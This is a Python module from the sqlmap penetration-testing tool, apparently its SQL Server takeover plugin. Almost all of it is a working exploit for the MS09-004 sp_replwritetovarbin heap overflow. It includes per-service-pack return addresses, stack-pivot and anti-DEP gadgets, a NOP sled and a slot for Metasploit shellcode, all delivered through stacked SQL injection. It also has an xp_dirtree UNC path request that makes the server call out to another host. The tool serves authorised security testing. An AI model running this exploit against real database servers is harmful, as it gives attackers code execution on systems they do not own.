#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import binascii

from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def __init__(self):
        self.spExploit = ""

        GenericTakeover.__init__(self)

    def uncPathRequest(self):
        #inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
        inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)

    def spHeapOverflow(self):
        """
        References:
        * http://www.microsoft.com/technet/security/bulletin/MS09-004.mspx
        * http://support.microsoft.com/kb/959420
        """

        returns = {
                    # 2003 Service Pack 0
                    "2003-0": (""),

                    # 2003 Service Pack 1
                    "2003-1": ("CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)" ),

                    # 2003 Service Pack 2 updated at 12/2008
                    #"2003-2": ("CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)" ),

                    # 2003 Service Pack 2 updated at 05/2009
                    "2003-2": ("CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)")

                    # 2003 Service Pack 2 updated at 09/2009
                    #"2003-2": ("CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)"),
                  }
        addrs = None

        for versionSp, data in returns.items():
            version, sp = versionSp.split("-")
            sp = int(sp)

            if kb.osVersion == version and kb.osSP == sp:
                addrs = data

                break

        if addrs is None:
            errMsg = "sqlmap can not exploit the stored procedure buffer "
            errMsg += "overflow because it does not have a valid return "
            errMsg += "code for the underlying operating system (Windows "
            errMsg += "%s Service Pack %d)" % (kb.osVersion, kb.osSP)
            raise sqlmapUnsupportedFeatureException(errMsg)

        shellcodeChar = ""
        hexStr = binascii.hexlify(self.shellcodeString[:-1])

        for hexPair in xrange(0, len(hexStr), 2):
            shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair+2]

        shellcodeChar = shellcodeChar[:-1]

        self.spExploit = """
        DECLARE @buf NVARCHAR(4000),
        @val NVARCHAR(4),
        @counter INT
        SET @buf = '
        DECLARE @retcode int, @end_offset int, @vb_buffer varbinary, @vb_bufferlen int
        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
        SET @val = CHAR(0x41)
        SET @counter = 0
        WHILE @counter < 3320
        BEGIN
          SET @counter = @counter + 1
          IF @counter = 411
          BEGIN
            /* pointer to call [ecx+8] */
            SET @buf = @buf + %s

            /* push ebp, pop esp, ret 4 */
            SET @buf = @buf + %s

            /* push ecx, pop esp, pop ebp, retn 8 */
            SET @buf = @buf + %s

            /* Garbage */
            SET @buf = @buf + CHAR(0x51)+CHAR(0x51)+CHAR(0x51)+CHAR(0x51)

            /* retn 1c */
            SET @buf = @buf + %s

            /* retn 1c */
            SET @buf = @buf + %s

            /* anti DEP */
            SET @buf = @buf + %s

            /* jmp esp */
            SET @buf = @buf + %s

            /* jmp esp */
            SET @buf = @buf + %s

            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)

            set @buf = @buf + CHAR(0x64)+CHAR(0x8B)+CHAR(0x25)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)
            set @buf = @buf + CHAR(0x8B)+CHAR(0xEC)
            set @buf = @buf + CHAR(0x83)+CHAR(0xEC)+CHAR(0x20)

            /* Metasploit shellcode */
            SET @buf = @buf + %s

            SET @buf = @buf + CHAR(0x6a)+CHAR(0x00)+char(0xc3)
            SET @counter = @counter + 302
            SET @val =  CHAR(0x43)
            CONTINUE
          END
          SET @buf = @buf + @val
        END
        SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''
        EXEC master..sp_executesql @buf
        """ % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)

        self.spExploit = self.spExploit.replace("    ", "").replace("\n", " ")

        logger.info("triggering the buffer overflow vulnerability, please wait..")
        inject.goStacked(self.spExploit, silent=True)
